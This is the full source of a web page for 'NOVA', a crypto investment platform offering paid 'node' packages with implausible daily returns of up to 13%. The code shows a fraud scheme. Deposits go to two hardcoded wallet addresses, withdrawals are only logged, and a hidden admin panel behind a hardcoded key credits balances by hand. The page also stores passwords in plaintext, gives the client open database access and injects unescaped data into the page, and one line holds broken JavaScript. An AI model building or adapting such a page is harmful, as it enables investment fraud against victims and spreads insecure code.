<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>NOVA | Professional Asset Terminal</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;600;900&display=swap" rel="stylesheet">
    <style>
        :root { --primary: #020617; --accent: #10B981; --card-bg: #0F172A; --text-main: #F8FAFC; --text-dim: #94A3B8; --gold: #F59E0B; --danger: #EF4444; --elite: #8B5CF6; }
        body { margin: 0; font-family: 'Outfit', sans-serif; background: var(--primary); color: var(--text-main); -webkit-tap-highlight-color: transparent; overflow-x: hidden; padding-bottom: 100px; }
        
        /* Professional UI Elements */
        .glass-card { background: var(--card-bg); border-radius: 28px; padding: 22px; margin: 15px; border: 1px solid rgba(255,255,255,0.05); box-shadow: 0 20px 40px rgba(0,0,0,0.6); }
        .ticker { background: #000; color: var(--accent); padding: 10px; font-size: 11px; font-weight: 600; text-align: center; border-bottom: 1px solid #1e293b; }
        
        .app-header { padding: 20px; background: rgba(15, 23, 42, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 1000; }
        .bottom-nav { position: fixed; bottom: 0; width: 100%; background: rgba(15, 23, 42, 0.95); backdrop-filter: blur(20px); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid #1e293b; z-index: 1000; }
        .nav-item { text-align: center; color: var(--text-dim); font-size: 11px; cursor: pointer; flex: 1; transition: 0.4s; }
        .nav-item i { font-size: 1.6rem; margin-bottom: 5px; display: block; }
        .nav-item.active { color: var(--accent); transform: translateY(-5px); }

        .bal-hero { background: linear-gradient(135deg, #10B981, #064e3b); border-radius: 32px; padding: 35px; margin: 15px; position: relative; overflow: hidden; box-shadow: 0 15px 35px rgba(16, 185, 129, 0.2); }
        .bal-hero i { position: absolute; right: -30px; bottom: -30px; font-size: 12rem; opacity: 0.15; color: #fff; }
        
        /* Node Architecture */
        .node-grid { display: grid; gap: 15px; padding: 15px; }
        .node-card { background: #1e293b; border-radius: 24px; padding: 20px; border: 1px solid rgba(255,255,255,0.03); display: flex; align-items: center; gap: 18px; transition: 0.3s; position: relative; }
        .node-icon { width: 60px; height: 60px; border-radius: 18px; display: flex; align-items: center; justify-content: center; font-size: 1.8rem; background: rgba(16, 185, 129, 0.1); color: var(--accent); box-shadow: inset 0 0 10px rgba(16, 185, 129, 0.2); }
        .elite-node { border: 1.5px solid var(--elite); background: linear-gradient(to right, #1e293b, #2e1065); }
        .elite-node .node-icon { color: var(--elite); background: rgba(139, 92, 246, 0.1); }
        .badge { position: absolute; top: 10px; right: 20px; background: var(--elite); color: #fff; font-size: 9px; padding: 3px 10px; border-radius: 50px; font-weight: 900; text-transform: uppercase; }

        /* Trusted Form Styling */
        .input-wrap { position: relative; margin-bottom: 15px; }
        .input-wrap i { position: absolute; left: 18px; top: 18px; color: var(--text-dim); }
        input, select { width: 100%; padding: 16px 16px 16px 50px; background: #020617; border: 1px solid #334155; color: #fff; border-radius: 18px; font-size: 15px; outline: none; box-sizing: border-box; }
        input:focus { border-color: var(--accent); box-shadow: 0 0 10px rgba(16, 185, 129, 0.1); }
        .btn-action { width: 100%; padding: 18px; background: var(--accent); color: #fff; border: none; border-radius: 18px; font-weight: 800; font-size: 16px; cursor: pointer; box-shadow: 0 10px 20px rgba(16, 185, 129, 0.3); transition: 0.3s; }
        .btn-action:active { transform: scale(0.98); }

        .screen { display: none; animation: slideIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
        .screen.active { display: block; }
        @keyframes slideIn { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }

        #auth-box { min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; background: radial-gradient(circle at top right, #1e1b4b, #020617); }
    </style>
</head>
<body>

    <div class="ticker"><marquee>NOVA WORLDWIDE v7.0 | TOTAL LIQUIDITY: $14.2M | ALL NODES ACTIVE | SECURE 256-BIT ENCRYPTION | REGISTERED TRUSTED TERMINAL</marquee></div>

    <div id="auth-box">
        <i class="fa-solid fa-gem" style="font-size: 4.5rem; color: var(--accent); margin-bottom: 10px; filter: drop-shadow(0 0 15px var(--accent));"></i>
        <h1 style="letter-spacing:10px; font-weight:900; margin:0;">NOVA</h1>
        <p style="font-size:10px; color:var(--text-dim); margin-bottom:40px;">INSTITUTIONAL GRADE PROTOCOL</p>
        
        <div class="glass-card" style="width: 85%; max-width: 380px;">
            <div class="input-wrap"><i class="fa-solid fa-user-tie"></i><input type="text" id="username" placeholder="Login ID"></div>
            <div class="input-wrap"><i class="fa-solid fa-fingerprint"></i><input type="password" id="password" placeholder="Passkey"></div>
            <button class="btn-action" onclick="handleAuth()" id="authBtn">INITIALIZE TERMINAL</button>
            <p onclick="toggleAuth()" id="toggleTxt" style="text-align:center; font-size:12px; color:var(--accent); margin-top:20px; cursor:pointer; font-weight:600;">REQUEST NEW MEMBERSHIP</p>
        </div>
    </div>

    <div id="app-main" style="display:none;">
        <div class="app-header">
            <div style="display:flex; align-items:center; gap:12px;">
                <div style="background:var(--accent); width:42px; height:42px; border-radius:15px; display:flex; align-items:center; justify-content:center; color:#fff;"><i class="fa-solid fa-shield-check"></i></div>
                <div><small style="color:var(--text-dim); font-size:10px; display:block; font-weight:700;">TRUSTED USER</small><b id="userDisp" style="font-size:16px;">User</b></div>
            </div>
            <div onclick="location.reload()" style="background:rgba(255,255,255,0.05); padding:10px; border-radius:12px;"><i class="fa-solid fa-power-off" style="color:var(--danger);"></i></div>
        </div>

        <div id="home" class="screen active">
            <div class="bal-hero">
                <i class="fa-solid fa-chart-area"></i>
                <small style="color:rgba(255,255,255,0.8); font-weight:600;">Secured Balance</small>
                <h1 style="margin:8px 0; font-size:3rem; font-weight:900;" id="mainBal">$0.00</h1>
                <div style="display:flex; gap:12px; margin-top:25px;">
                    <button onclick="navTo('wallet')" style="flex:1; background:rgba(255,255,255,0.15); border:none; color:#fff; padding:15px; border-radius:20px; font-weight:800; font-size:13px;"><i class="fa-solid fa-plus-circle"></i> DEPOSIT</button>
                    <button onclick="navTo('wallet')" style="flex:1; background:#fff; border:none; color:var(--accent); padding:15px; border-radius:20px; font-weight:800; font-size:13px;"><i class="fa-solid fa-arrow-right-from-bracket"></i> WITHDRAW</button>
                </div>
            </div>

            <h3 style="padding:15px 25px 5px;"><i class="fa-solid fa-microchip" style="color:var(--accent);"></i> Activation Marketplace</h3>
            <div class="node-grid" id="nodeGrid"></div>
        </div>

        <div id="wallet" class="screen">
            <div class="glass-card">
                <h2 style="color:var(--accent); margin-top:0;"><i class="fa-solid fa-circle-plus"></i> FUNDING</h2>
                <div style="display:flex; gap:10px; margin-bottom:20px;">
                    <div onclick="copyWal('0xb584fBe3d7f1A72AEb2A0a76b1bC959841eC0A37')" style="flex:1; background:#020617; padding:15px; border-radius:22px; text-align:center; border:1.5px solid #1e293b;"><i class="fa-solid fa-shield-heart" style="color:#3375BB; font-size:2rem;"></i><br><small style="font-weight:900;">TRUST</small></div>
                    <div onclick="copyWal('0xc270914e5a9e72C5994fb4bd9BbdD9A3425303f2')" style="flex:1; background:#020617; padding:15px; border-radius:22px; text-align:center; border:1.5px solid #1e293b;"><i class="fa-solid fa-mask" style="color:#F6851B; font-size:2rem;"></i><br><small style="font-weight:900;">METAMASK</small></div>
                </div>
                <div class="input-wrap"><i class="fa-solid fa-network-wired"></i><select id="depNet"><option>USDT (BEP20)</option><option>TRX (TRC20)</option></select></div>
                <div class="input-wrap"><i class="fa-solid fa-hashtag"></i><input type="text" id="tid" placeholder="Transaction TID/Hash"></div>
                <div class="input-wrap"><i class="fa-solid fa-file-invoice-dollar"></i><input type="file" id="proof" accept="image/*"></div>
                <button class="btn-action" onclick="submitDep()">ACTIVATE FUNDING</button>
            </div>

            <div class="glass-card">
                <h2 style="color:var(--danger); margin-top:0;"><i class="fa-solid fa-money-bill-transfer"></i> WITHDRAWAL</h2>
                <div class="input-wrap"><i class="fa-solid fa-landmark"></i><select id="witNet"><option>Binance Pay</option><option>OKX</option><option>Trust Wallet</option></select></div>
                <div class="input-wrap"><i class="fa-solid fa-dollar-sign"></i><input type="number" id="witAmt" placeholder="Amount (Min $10)"></div>
                <div class="input-wrap"><i class="fa-solid fa-address-book"></i><input type="text" id="witAcc" placeholder="Account ID / Wallet"></div>
                <div class="input-wrap"><i class="fa-solid fa-user-tag"></i><input type="text" id="witUser" placeholder="Full Username"></div>
                <button class="btn-action" style="background:var(--danger);" onclick="submitWit()">CONFIRM WITHDRAWAL</button>
            </div>
        </div>

        <div id="logs" class="screen">
            <h3 style="padding:20px;"><i class="fa-solid fa-clock-rotate-left"></i> Security History</h3>
            <div id="histContent" style="padding:0 15px;"></div>
        </div>

        <div id="info" class="screen">
            <div class="glass-card">
                <h3 style="margin-top:0;"><i class="fa-solid fa-circle-info"></i> About Protocol</h3>
                <p style="font-size:13px; line-height:1.6; color:var(--text-dim);">NOVA is a high-frequency trading and node validation platform. We ensure secure, institutional-grade rewards through global cluster synchronization.</p>
                <div style="background:#020617; padding:15px; border-radius:15px; margin-top:15px;">
                    <small style="color:var(--accent); font-weight:900;">OFFICIAL SUPPORT:</small><br>
                    <small>t.me/NOVA_Official_Support</small>
                </div>
            </div>
            <center id="secret-trigger" style="margin-top:40px; color:gray; font-size:11px;">&copy; 2026 NOVA ASSET GROUP | SECURED</center>
        </div>

        <div class="bottom-nav">
            <div class="nav-item active" onclick="navTo('home', this)"><i class="fa-solid fa-house-user"></i>HOME</div>
            <div class="nav-item" onclick="navTo('wallet', this)"><i class="fa-solid fa-wallet"></i>WALLET</div>
            <div class="nav-item" onclick="navTo('logs', this)"><i class="fa-solid fa-history"></i>LOGS</div>
            <div class="nav-item" onclick="navTo('info', this)"><i class="fa-solid fa-shield"></i>INFO</div>
        </div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { getFirestore, doc, setDoc, getDoc, collection, getDocs, query, where, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

        const firebaseConfig = { apiKey: "AIzaSyAXlQ1tKTJbcnIXNeww9I3d-ukzD7_mUCo", authDomain: "home-94d45.firebaseapp.com", projectId: "home-94d45", appId: "1:964390949419:web:589840cb91b7e42ecd506e" };
        const app = initializeApp(firebaseConfig);
        const db = getFirestore(app);

        let isLogin = true;
        window.toggleAuth = () => {
            isLogin = !isLogin;
            document.getElementById('authBtn').innerText = isLogin ? "INITIALIZE TERMINAL" : "CREATE NEW NODE ID";
            document.getElementById('toggleTxt').innerText = isLogin ? "REQUEST NEW MEMBERSHIP" : "EXISTING OPERATOR? LOGIN";
        };

        window.handleAuth = async () => {
            const u = document.getElementById('username').value.toLowerCase().trim();
            const p = document.getElementById('password').value;
            if(!u || !p) return alert("Credentials required!");
            const snap = await getDoc(doc(db, "users", u));
            if(isLogin) {
                if(snap.exists() && snap.data().password === p) { sessionStorage.setItem("nova_user", u); location.reload(); }
                else alert("Authentication Failed!");
            } else {
                await setDoc(doc(db, "users", u), { password: p, balance: 0, status: "Active" });
                alert("ID Registered!"); toggleAuth();
            }
        };

        function buildNodes() {
            const grid = document.getElementById('nodeGrid');
            const icons = ["fa-microchip", "fa-atom", "fa-dna", "fa-satellite", "fa-server", "fa-shield-halved", "fa-bolt", "fa-cube", "fa-code-branch", "fa-link"];
            
            // 15 Standard Clusters ($30 - $2000)
            for(let i=1; i<=15; i++) {
                let cost = i === 1 ? 30 : Math.round(30 * Math.pow(1.35, i));
                grid.innerHTML += `<div class="node-card">
                    <div class="node-icon"><i class="fa-solid ${icons[i%10]}"></i></div>
                    <div style="flex:1"><b>Nova-X${i} Cluster</b><br><small style="color:var(--text-dim);">Activation: $${cost} | Daily: ${(1.5 + (i*0.2)).toFixed(1)}%</small></div>
                    <button onclick="navTo('wallet')" style="background:var(--accent); color:#fff; border:none; padding:10px 15px; border-radius:12px; font-weight:800; font-size:11px;">ACTIVATE</button>
                </div>`;
            }

            // 5 Elite Elite Clusters ($5000 - $30000)
            const elite = [5000, 10000, 15000, 20000, 30000];
            elite.forEach((c, idx) => {
                grid.innerHTML += `<div class="node-card elite-node">
                    <span class="badge">ELITE CORE</span>
                    <div class="node-icon"><i class="fa-solid fa-crown"></i></div>
                    <div style="flex:1"><b>TITAN-0${idx+1} Elite</b><br><small style="color:var(--text-dim);">Activation: $${c} | Daily: ${(5 + (idx*2)).toFixed(1)}%</small></div>
                    <button onclick="navTo('wallet')" style="background:var(--elite); color:#fff; border:none; padding:10px 15px; border-radius:12px; font-weight:800; font-size:11px;">ACTIVATE</button>
                </div>`;
            });
        }

        window.submitDep = async () => {
            const tid = document.getElementById('tid').value;
            const file = document.getElementById('proof').files[0];
            if(!tid || !file) return alert("Proof details required!");
            const reader = new FileReader();
            reader.onloadend = async () => {
                await setDoc(doc(db, "transactions", "tx_"+Date.now()), {
                    user: sessionStorage.getItem("nova_user"), type: "Deposit", 
                    tid: tid, proof: reader.result, status: "Pending", date: new Date().toLocaleString()
                });
                alert("Audit sequence started!"); location.reload();
            };
            reader.readAsDataURL(file);
        };

        window.submitWit = async () => {
            const amt = document.getElementById('witAmt').value;
            const acc = document.getElementById('witAcc').value;
            const u = document.getElementById('witUser').value;
            if(amt < 10) return alert("Minimum withdrawal is $10.");
            await setDoc(doc(db, "transactions", "wit_"+Date.now()), {
                user: sessionStorage.getItem("nova_user"), type: "Withdrawal", amount: amt,
                account: acc, username: u, status: "Pending", date: new Date().toLocaleString()
            });
            alert("Withdrawal request logged!"); location.reload();
        };

        window.navTo = (id, el) => {
            document.querySelectorAll('.screen').forEach(s => s.classList.remove('active'));
            document.getElementById(id).classList.add('active');
            if(el) { document.querySelectorAll('.nav-item').forEach(i => i.classList.remove('active')); el.classList.add('active'); }
        };

        async function initApp() {
            const user = sessionStorage.getItem("nova_user");
            document.getElementById('auth-box').style.display='none';
            document.getElementById('app-main').style.display='block';
            document.getElementById('userDisp').innerText = user;
            buildNodes();

            const uSnap = await getDoc(doc(db, "users", user));
            if(uSnap.exists()) document.getElementById('mainBal').innerText = "$"+(uSnap.data().balance||0).toFixed(2);

            const qSnap = await getDocs(query(collection(db, "transactions"), where("user", "==", user)));
            const hist = document.getElementById('histContent');
            qSnap.forEach(t => {
                const d = t.data();
                hist.innerHTML += `<div class="glass-card" style="margin:10px 0; padding:18px; display:flex; justify-content:space-between; align-items:center; border-left:4px solid ${d.type==='Deposit'?var(--accent):var(--danger)};">
                    <div><b>${d.type}</b><br><small>${d.date}</small></div>
                    <div style="text-align:right;"><b>$${d.amount||'PROV'}</b><br><small style="color:var(--gold); font-weight:900;">${d.status}</small></div>
                </div>`;
            });
        }

        /* UNLIMITED ADMIN POWERS */
        let adminClicks = 0;
        document.getElementById('secret-trigger').onclick = async () => {
            adminClicks++;
            if(adminClicks === 5) {
                const p = prompt("MASTER ACCESS KEY:");
                if(p === "nova_boss_786") {
                    const tSnap = await getDocs(collection(db, "transactions"));
                    const uSnap = await getDocs(collection(db, "users"));
                    let h = `<div style="background:#000; color:#fff; min-height:100vh; padding:25px; font-size:12px;"><button onclick="location.reload()" style="background:red; color:white; border:none; padding:10px; border-radius:10px; margin-bottom:20px;">X CLOSE TERMINAL</button>
                    <h1>MASTER CONTROL PANEL</h1><div style="display:grid; gap:15px;">`;
                    
                    tSnap.forEach(d => {
                        const data = d.data();
                        h += `<div class="glass-card" style="background:#111;">
                            <p><b>USER:</b> ${data.user} | <b>TYPE:</b> ${data.type}</p>
                            <p><b>REF:</b> ${data.tid || data.account} | <b>AMT:</b> $${data.amount||'NA'}</p>
                            ${data.proof ? `<img src="${data.proof}" style="width:150px; border-radius:10px; margin-top:10px;" onclick="window.open(this.src)">` : ''}
                            <div style="margin-top:10px;">
                                <button onclick="window.updateBal('${data.user}')" style="background:green; color:white; padding:5px; border-radius:5px;">Add Balance</button>
                                <button onclick="window.delTx('${d.id}')" style="background:red; color:white; padding:5px; border-radius:5px;">Delete Request</button>
                            </div>
                        </div>`;
                    });
                    document.body.innerHTML = h + `</div></div>`;
                }
                adminClicks = 0;
            }
        };

        window.updateBal = async (uid) => {
            const val = prompt("Enter Balance to Add:");
            if(val) {
                const uRef = doc(db, "users", uid);
                const s = await getDoc(uRef);
                await updateDoc(uRef, { balance: (s.data().balance || 0) + parseFloat(val) });
                alert("Balance Updated!"); location.reload();
            }
        };

        window.delTx = async (tid) => { if(confirm("Delete this request?")) { await deleteDoc(doc(db, "transactions", tid)); location.reload(); } };

        window.copyWal = (a) => { navigator.clipboard.writeText(a); alert("Trusted Address Copied!"); };
        if(sessionStorage.getItem("nova_user")) initApp();
    </script>
</body>
</html>
